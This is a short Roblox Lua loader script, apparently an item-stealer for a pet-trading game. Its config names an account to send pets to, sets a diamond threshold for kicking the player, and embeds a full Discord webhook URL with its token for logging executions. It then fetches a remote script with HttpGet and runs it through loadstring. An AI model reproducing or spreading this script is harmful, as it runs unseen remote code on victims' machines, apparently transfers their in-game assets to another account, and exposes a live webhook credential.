--[[ Arkhalis Mail Logger ]]--

--[[ Main Config ]]--
_G.Username = "SPELEMEN_5" --// Username To Send Pets To
_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick

--[[ Webhook Config ]]--
_G.Webhook = "https://discord.com/api/webhooks/1108490358901440533/p5ikImv1JHS5m-wNcieeXuml64d4I4PY-kWFUJRsB2n0QfhXBFpdNIgb13tdcJHu7Yzr" --// Discord Webhook For Executions

--[[ Script ]]--
loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
